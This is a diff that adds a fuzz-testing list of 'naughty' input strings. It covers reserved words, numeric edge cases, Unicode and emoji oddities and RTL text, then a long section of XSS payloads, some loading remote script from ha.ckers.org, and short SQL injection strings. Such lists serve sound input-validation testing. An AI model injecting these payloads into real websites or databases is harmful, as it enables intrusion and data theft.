@@ -1,0 +1,910 @@
+#   Special Strings
+#   inspired/supported by [Themis](https://github.com/the-themis-benchmarks/home)
+
+Android
+com.
+&bsol
+&#92
+ 
+*
+* xx(xx)
+
+
+#	Reserved Strings
+#
+#	Strings which may be used elsewhere in code
+
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+true
+false
+True
+False
+TRUE
+FALSE
+None
+hasOwnProperty
+\
+\\
+
+#	Numeric Strings
+#
+#	Strings which can be interpreted as numeric
+
+0
+1
+1.00
+$1.00
+1/2
+1E2
+1E02
+1E+02
+-1
+-1.00
+-$1.00
+-1/2
+-1E2
+-1E02
+-1E+02
+1/0
+0/0
+-2147483648/-1
+-9223372036854775808/-1
+-0
+-0.0
++0
++0.0
+0.00
+0..0
+.
+0.0.0
+0,00
+0,,0
+,
+0,0,0
+0.0/0
+1.0/0.0
+0.0/0.0
+1,0/0,0
+0,0/0,0
+--1
+-
+-.
+-,
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+NaN
+Infinity
+-Infinity
+INF
+1#INF
+-1#IND
+1#QNAN
+1#SNAN
+1#IND
+0x0
+0xffffffff
+0xffffffffffffffff
+0xabad1dea
+123456789012345678901234567890123456789
+1,000.00
+1 000.00
+1'000.00
+1,000,000.00
+1 000 000.00
+1'000'000.00
+1.000,00
+1 000,00
+1'000,00
+1.000.000,00
+1 000 000,00
+1'000'000,00
+01000
+08
+09
+2.2250738585072011e-308
+
+#	Special Characters
+#
+# ASCII punctuation.  All of these characters may need to be escaped in some
+# contexts.  Divided into three groups based on (US-layout) keyboard position.
+
+,./;'[]\-=
+<>?:"{}|_+
+!@#$%^&*()`~
+
+# Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F,
+# and U+007F (DEL)
+# Often forbidden to appear in various text-based file formats (e.g. XML),
+# or reused for internal delimiters on the theory that they should never
+# appear in input.
+# The next line may appear to be blank or mojibake in some viewers.
+
+
+# Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through U+009F.
+# Commonly misinterpreted as additional graphic characters.
+# The next line may appear to be blank, mojibake, or dingbats in some viewers.
+
+
+# Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode
+# version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL),
+# and U+200B (ZERO WIDTH SPACE), which are in the C categories but are often
+# treated as whitespace in some contexts.
+# This file unfortunately cannot express strings containing
+# U+0000, U+000A, or U+000D (NUL, LF, CR).
+# The next line may appear to be blank or mojibake in some viewers.
+# The next line may be flagged for "trailing whitespace" in some viewers.
+	              ​    　
+
+# Unicode additional control characters: all of the characters with
+# general category Cf (in Unicode 8.0.0).
+# The next line may appear to be blank or mojibake in some viewers.
+­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿
+
+# "Byte order marks", U+FEFF and U+FFFE, each on its own line.
+# The next two lines may appear to be blank or mojibake in some viewers.
+﻿
+￾
+
+#	Unicode Symbols
+#
+#	Strings which contain common unicode symbols (e.g. smart quotes)
+
+Ω≈ç√∫˜µ≤≥÷
+åß∂ƒ©˙∆˚¬…æ
+œ∑´®†¥¨ˆøπ“‘
+¡™£¢∞§¶•ªº–≠
+¸˛Ç◊ı˜Â¯˘¿
+ÅÍÎÏ˝ÓÔÒÚÆ☃
+Œ„´‰ˇÁ¨ˆØ∏”’
+`⁄€‹›ﬁﬂ‡°·‚—±
+⅛⅜⅝⅞
+ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя
+٠١٢٣٤٥٦٧٨٩
+
+#	Unicode Subscript/Superscript/Accents
+#
+#	Strings which contain unicode subscripts/superscripts; can cause rendering issues
+
+⁰⁴⁵
+₀₁₂
+⁰⁴⁵₀₁₂
+ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็
+
+#	Quotation Marks
+#
+#	Strings which contain misplaced quotation marks; can cause encoding errors
+
+'
+"
+''
+""
+'"'
+"''''"'"
+"'"'"''''"
+<foo val=“bar” />
+<foo val=“bar” />
+<foo val=”bar“ />
+<foo val=`bar' />
+
+#	Two-Byte Characters
+#
+#	Strings which contain two-byte characters: can cause rendering issues or character-length issues
+
+田中さんにあげて下さい
+パーティーへ行かないか
+和製漢語
+部落格
+사회과학원 어학연구소
+찦차를 타고 온 펲시맨과 쑛다리 똠방각하
+社會科學院語學研究所
+울란바토르
+𠜎𠜱𠝹𠱓𠱸𠲖𠳏
+
+#	Changing length when lowercased
+#
+#	Characters which increase in length (2 to 3 bytes) when lowercased
+#	Credit: https://twitter.com/jifa/status/625776454479970304
+
+Ⱥ
+Ⱦ
+
+#	Japanese Emoticons
+#
+#	Strings which consists of Japanese-style emoticons which are popular on the web
+
+ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ
+(｡◕ ∀ ◕｡)
+｀ｨ(´∀｀∩
+__ﾛ(,_,*)
+・(￣∀￣)・:*:
+ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ
+,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’
+(╯°□°）╯︵ ┻━┻)
+(ﾉಥ益ಥ）ﾉ﻿ ┻━┻
+┬─┬ノ( º _ ºノ)
+( ͡° ͜ʖ ͡°)
+¯\_(ツ)_/¯
+
+#	Emoji
+#
+#	Strings which contain Emoji; should be the same behavior as two-byte characters, but not always
+
+😍
+👩🏽
+👾 🙇 💁 🙅 🙆 🙋 🙎 🙍
+🐵 🙈 🙉 🙊
+❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙
+✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿
+🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧
+0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟
+
+#       Regional Indicator Symbols
+#
+#       Regional Indicator Symbols can be displayed differently across
+#       fonts, and have a number of special behaviors
+
+🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸
+🇺🇸🇷🇺🇸🇦🇫🇦🇲
+🇺🇸🇷🇺🇸🇦
+
+#	Unicode Numbers
+#
+#	Strings which contain unicode numbers; if the code is localized, it should see the input as numeric
+
+１２３
+١٢٣
+
+#	Right-To-Left Strings
+#
+#	Strings which contain text that should be rendered RTL if possible (e.g. Arabic, Hebrew)
+
+ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.
+בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ
+הָיְתָהtestالصفحات التّحول
+﷽
+ﷺ
+مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،
+
+#	Trick Unicode
+#
+#	Strings which contain unicode with unusual properties (e.g. Right-to-left override) (c.f. http://www.unicode.org/charts/PDF/U2000.pdf)
+
+‪‪test‪
+‫test‫
+ test 
+test⁠test‫
+⁦test⁧
+
+#	Zalgo Text
+#
+#	Strings which contain "corrupted" text. The corruption will not appear in non-HTML text, however. (via http://www.eeemo.net)
+
+Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣
+̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰
+̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟
+̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕
+Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
+
+#	Unicode Upsidedown
+#
+#	Strings which contain unicode with an "upsidedown" effect (via http://www.upsidedowntext.com)
+
+˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥
+00˙Ɩ$-
+
+#	Unicode font
+#
+#	Strings which contain bold/italic/etc. versions of normal characters
+
+Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ
+𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠
+𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌
+𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈
+𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰
+𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘
+𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐
+⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢
+
+#	Script Injection
+#
+#	Strings which attempt to invoke a benign script injection; shows vulnerability to XSS
+
+<script>alert(123)</script>
+&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
+<img src=x onerror=alert(123) />
+<svg><script>123<1>alert(123)</script>
+"><script>alert(123)</script>
+'><script>alert(123)</script>
+><script>alert(123)</script>
+</script><script>alert(123)</script>
+< / script >< script >alert(123)< / script >
+ onfocus=JaVaSCript:alert(123) autofocus
+" onfocus=JaVaSCript:alert(123) autofocus
+' onfocus=JaVaSCript:alert(123) autofocus
+＜script＞alert(123)＜/script＞
+<sc<script>ript>alert(123)</sc</script>ript>
+--><script>alert(123)</script>
+";alert(123);t="
+';alert(123);t='
+JavaSCript:alert(123)
+;alert(123);
+src=JaVaSCript:prompt(132)
+"><script>alert(123);</script x="
+'><script>alert(123);</script x='
+><script>alert(123);</script x=
+" autofocus onkeyup="javascript:alert(123)
+' autofocus onkeyup='javascript:alert(123)
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
+ABC<div style="x:expression\x00(javascript:alert(1)">DEF
+ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
+ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x09expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
+ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
+ABC<div style="x:\x20expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
+ABC<div style="x:\x00expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
+ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+"`'><script>\x0Cjavascript:alert(1)</script>
+"`'><script>\x2Bjavascript:alert(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x0Ajavascript:alert(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+"`'><script>\xC2\x85javascript:alert(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+"`'><script>\x21javascript:alert(1)</script>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\x20javascript:alert(1)</script>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+<img \x00src=x onerror="alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+<img \x12src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x10src=x onerror="javascript:alert(1)">
+<img\x13src=x onerror="javascript:alert(1)">
+<img\x32src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x11src=x onerror="javascript:alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x34src=x onerror="javascript:alert(1)">
+<img \x39src=x onerror="javascript:alert(1)">
+<img \x00src=x onerror="javascript:alert(1)">
+<img src\x09=x onerror="javascript:alert(1)">
+<img src\x10=x onerror="javascript:alert(1)">
+<img src\x13=x onerror="javascript:alert(1)">
+<img src\x32=x onerror="javascript:alert(1)">
+<img src\x12=x onerror="javascript:alert(1)">
+<img src\x11=x onerror="javascript:alert(1)">
+<img src\x00=x onerror="javascript:alert(1)">
+<img src\x47=x onerror="javascript:alert(1)">
+<img src=x\x09onerror="javascript:alert(1)">
+<img src=x\x10onerror="javascript:alert(1)">
+<img src=x\x11onerror="javascript:alert(1)">
+<img src=x\x12onerror="javascript:alert(1)">
+<img src=x\x13onerror="javascript:alert(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<img src=x onerror=\x09"javascript:alert(1)">
+<img src=x onerror=\x10"javascript:alert(1)">
+<img src=x onerror=\x11"javascript:alert(1)">
+<img src=x onerror=\x12"javascript:alert(1)">
+<img src=x onerror=\x32"javascript:alert(1)">
+<img src=x onerror=\x00"javascript:alert(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(1)//">
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<!--[if]><script>javascript:alert(1)</script -->
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<script src="/\%(jscript)s"></script>
+<script src="\\%(jscript)s"></script>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav   ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=http://ha.ckers.org/scriptlet.html <
+\";alert('XSS');//
+<u oncopy=alert()> Copy me</u>
+<i onwheel=alert(1)> Scroll over me </i>
+<plaintext>
+http://a/%%30%30
+</textarea><script>alert(123)</script>
+
+#	SQL Injection
+#
+#	Strings which can cause a SQL injection if inputs are not sanitized
+
+1; SELECT 1
+1'; SELECT 1-- 1
+' OR 1=1 -- 1
+' OR '1'='1
+
+%
+_
+
+#	Server Code Injection
+#
